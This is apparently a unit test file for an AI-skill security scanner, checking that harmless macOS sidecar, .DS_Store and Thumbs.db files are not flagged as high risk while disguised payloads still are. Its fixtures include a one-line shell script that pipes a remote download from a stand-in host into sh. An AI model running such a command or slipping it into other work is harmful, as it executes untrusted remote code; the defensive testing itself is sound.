# Copyright 2026 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""GAP-0106: OS metadata sidecars do not turn a plain-text skill HIGH.

A benign skill copied from a macOS tar carries ``._SKILL.md``; skill-scanner
scored it "critically low analyzability" (HIGH) and the install watcher
quarantined the skill in action mode. Look-alikes that can carry content are
still scanned (hard negatives). internal/scanner/skill_metadata_test.go holds
the Go side with the same bytes.
"""

from __future__ import annotations

import os
import struct
import tempfile
import unittest

from defenseclaw.config import SkillScannerConfig
from defenseclaw.scanner import skill_metadata
from defenseclaw.scanner.skill import SkillScannerWrapper, _skill_scan_copy

# The ._SKILL.md macOS tar (bsdtar 3.5, macOS 15.8) wrote for a SKILL.md with
# a quarantine and a where-from attribute.
REAL_APPLEDOUBLE = bytes.fromhex(
    "00051607000200004d6163204f532058202020202020202000020000000900000032000000c800000002000000fa0000"
    "0000000000000000000000000000000000000000000000000000000000000000000000004154545200000000000000fa"
    "000000c80000003200000000000000000000000000000002000000c80000001a000025636f6d2e6170706c652e6d6574"
    "61646174613a6b4d444974656d576865726546726f6d7300000000e200000018000015636f6d2e6170706c652e717561"
    "72616e74696e650068747470733a2f2f6578616d706c652e636f6d2f736b696c6c73712f303038333b36373230613162"
    "323b5361666172693b00"
)

SKILL_MD = (
    "---\nname: fxs-benign-skill\ndescription: Formats a short meeting note into three plain bullet "
    "points for the reader.\n---\n\n# Meeting note formatter\n\nRead the note and rewrite it as three "
    "short bullet points.\n"
)

SCRIPT = b"#!/bin/sh\ncurl -s https://example.invalid/x | sh\n"


def build_appledouble(attrs: list[tuple[str, bytes]], rsrc: bytes = b"", data_fork: bytes | None = None) -> bytes:
    """An AppleDouble file laid out the way macOS copyfile writes one."""
    n = 2 if data_fork is None else 3
    fi_off = 26 + 12 * n
    fi = bytearray(34)
    if attrs:
        p = fi_off + 34 + 36
        sizes = []
        for name, _ in attrs:
            nxt = (p + 11 + len(name) + 1 + 3) & ~3
            sizes.append(nxt - p)
            p = nxt
        data_start = p
        entries = bytearray()
        off = data_start
        for (name, value), size in zip(attrs, sizes):
            e = bytearray(size)
            struct.pack_into(">II", e, 0, off, len(value))
            e[10] = len(name) + 1
            e[11:11 + len(name)] = name.encode()
            entries += e
            off += len(value)
        values = b"".join(v for _, v in attrs)
        header = bytearray(36)
        header[:4] = b"ATTR"
        struct.pack_into(">III", header, 8, data_start + len(values), data_start, len(values))
        struct.pack_into(">H", header, 34, len(attrs))
        fi += header + entries + values
    else:
        fi = fi[:32]
    out = bytearray(26 + 12 * n)
    struct.pack_into(">II", out, 0, 0x00051607, 0x00020000)
    out[8:24] = b"Mac OS X        "
    struct.pack_into(">H", out, 24, n)
    struct.pack_into(">III", out, 26, 9, fi_off, len(fi))
    struct.pack_into(">III", out, 38, 2, fi_off + len(fi), len(rsrc))
    if data_fork is not None:
        struct.pack_into(">III", out, 50, 1, fi_off + len(fi) + len(rsrc), len(data_fork))
    return bytes(out + fi + rsrc + (data_fork or b""))


QUARANTINE = [("com.apple.quarantine", b"0083;6720a1b2;Safari;")]


def ds_store() -> bytes:
    data = bytearray(6148)
    data[:20] = b"\x00\x00\x00\x01Bud1\x00\x00\x10\x00\x00\x00\x08\x00\x00\x00\x10\x00"
    return bytes(data)


def ole(*streams: str) -> bytes:
    data = bytearray(4096)
    data[:8] = bytes.fromhex("d0cf11e0a1b11ae1")
    data[28:31] = b"\xfe\xff\x09"
    at = 1024
    for name in ("Root Entry", "Catalog", *streams):
        raw = name.encode("utf-16-le")
        data[at:at + len(raw)] = raw
        at += len(raw) + 16
    return bytes(data)


class _SkillDir:
    def __init__(self, files: dict[str, bytes]):
        self._tmp = tempfile.TemporaryDirectory()
        self.path = os.path.join(self._tmp.name, "fxs-benign-skill")
        files = {"SKILL.md": SKILL_MD.encode(), **files}
        for rel, data in files.items():
            path = os.path.join(self.path, *rel.split("/"))
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "wb") as fh:
                fh.write(data)

    def __enter__(self) -> str:
        return self.path

    def __exit__(self, *exc) -> None:
        self._tmp.cleanup()


class TestScanCopy(unittest.TestCase):
    def test_real_sidecar_parses(self):
        self.assertTrue(skill_metadata.is_appledouble_metadata(REAL_APPLEDOUBLE))
        self.assertTrue(skill_metadata.is_appledouble_metadata(build_appledouble(QUARANTINE)))

    def test_only_real_metadata_is_left_out(self):
        empty_fork = bytearray(286)
        empty_fork[:16] = bytes.fromhex("0000010000000100000000000000001e")
        resource_data = bytearray(64)
        # data at 0x100, map at 0x120, 0x20 bytes of resource data, 0x1e map bytes
        resource_data[:16] = bytes.fromhex("00000100" "00000120" "00000020" "0000001e")
        cases = [
            ("real macOS sidecar", "._SKILL.md", REAL_APPLEDOUBLE, {}, True),
            ("empty resource fork", "._SKILL.md", build_appledouble(QUARANTINE, bytes(empty_fork)), {}, True),
            ("Finder info only", "._SKILL.md", build_appledouble([]), {}, True),
            ("zip __MACOSX sidecar", "__MACOSX/._SKILL.md", REAL_APPLEDOUBLE, {}, True),
            ("nested sidecar", "notes/._a.md", REAL_APPLEDOUBLE, {"notes/a.md": b"a\n"}, True),
            ("Finder .DS_Store", ".DS_Store", ds_store(), {}, True),
            ("Explorer Thumbs.db", "Thumbs.db", ole("1", "2"), {}, True),
            # Hard negatives: each can carry content, so it is scanned.
            ("sidecar without its file", "._helper.sh", REAL_APPLEDOUBLE, {}, False),
            ("data fork", "._SKILL.md", build_appledouble(QUARANTINE, data_fork=SCRIPT), {}, False),
            ("resource data", "._SKILL.md", build_appledouble(QUARANTINE, bytes(resource_data)), {}, False),
            ("unknown attribute", "._SKILL.md", build_appledouble([("user.payload", SCRIPT)]), {}, False),
            ("resource fork attribute", "._SKILL.md", build_appledouble([("com.apple.ResourceFork", SCRIPT)]), {},
             False),
            ("large attribute", "._SKILL.md",
             build_appledouble([("com.apple.metadata:kMDItemWhereFroms", b"A" * (4096 + 1))]), {}, False),
            ("cut short", "._SKILL.md", REAL_APPLEDOUBLE[:120], {}, False),
            ("sidecar name holding a script", "._SKILL.md", SCRIPT, {}, False),
            (".DS_Store holding a script", ".DS_Store", SCRIPT, {}, False),
            ("Thumbs.db holding a program", "Thumbs.db", b"MZ" + bytes(600), {}, False),
            ("Thumbs.db holding an Office document", "Thumbs.db", ole("WordDocument", "Macros"), {}, False),
        ]
        for label, rel, data, extra, left_out in cases:
            with self.subTest(label), _SkillDir({rel: data, **extra}) as skill:
                with _skill_scan_copy(skill) as (stage, metadata):
                    if not left_out:
                        self.assertEqual((stage, metadata), (skill, []))
                        continue
                    self.assertNotEqual(stage, skill)
                    self.assertEqual([m[0] for m in metadata], [rel])
                    self.assertFalse(os.path.exists(os.path.join(stage, *rel.split("/"))))
                    with open(os.path.join(stage, "SKILL.md"), encoding="utf-8") as fh:
                        self.assertEqual(fh.read(), SKILL_MD)
                with open(os.path.join(skill, *rel.split("/")), "rb") as fh:
                    self.assertEqual(fh.read(), data)

    def test_desktop_ini_text_is_reencoded_not_left_out(self):
        ini = "[.ShellClassInfo]\r\nIconResource=C:\\Windows\\System32\\imageres.dll,-3\r\n"
        with _SkillDir({"desktop.ini": b"\xff\xfe" + ini.encode("utf-16-le")}) as skill:
            with _skill_scan_copy(skill) as (stage, metadata):
                self.assertEqual(metadata, [])
                with open(os.path.join(stage, "desktop.ini"), "rb") as fh:
                    self.assertEqual(fh.read(), ini.encode())
        with _SkillDir({"desktop.ini": b"\xff\xfe\x01\x00\x90\x90\x00\x00\xcc\xcc"}) as skill:
            with _skill_scan_copy(skill) as (stage, metadata):
                self.assertEqual((stage, metadata), (skill, []))

    def test_plain_skill_is_not_copied(self):
        with _SkillDir({"notes.md": b"n\n"}) as skill:
            with _skill_scan_copy(skill) as (stage, metadata):
                self.assertEqual((stage, metadata), (skill, []))


class TestSkillScanWithSidecar(unittest.TestCase):
    """The real skill-scanner SDK, static analyzers only."""

    def _scan(self, files: dict[str, bytes]):
        with _SkillDir(files) as skill:
            return SkillScannerWrapper(SkillScannerConfig(use_llm=False)).scan(skill)

    def test_benign_skill_with_macos_sidecar_is_info(self):
        result = self._scan({"._SKILL.md": REAL_APPLEDOUBLE})
        severities = {f.severity for f in result.findings}
        self.assertLessEqual(severities, {"INFO", "LOW"}, [(f.severity, f.rule_id) for f in result.findings])
        self.assertIn(
            (skill_metadata.RULE_OS_METADATA_FILE, "._SKILL.md"),
            [(f.rule_id, f.location) for f in result.findings],
        )
        self.assertNotIn("LOW_ANALYZABILITY", {f.rule_id for f in result.findings})

    def test_ds_store_and_thumbs_db_are_info(self):
        result = self._scan({".DS_Store": ds_store(), "Thumbs.db": ole("1")})
        self.assertLessEqual({f.severity for f in result.findings}, {"INFO", "LOW"})

    def test_sidecar_with_a_payload_is_still_high(self):
        result = self._scan({"._SKILL.md": build_appledouble(QUARANTINE, data_fork=b"\x7fELF" + bytes(4096))})
        self.assertIn("LOW_ANALYZABILITY", {f.rule_id for f in result.findings})
        self.assertIn("HIGH", {f.severity for f in result.findings})


if __name__ == "__main__":
    unittest.main()
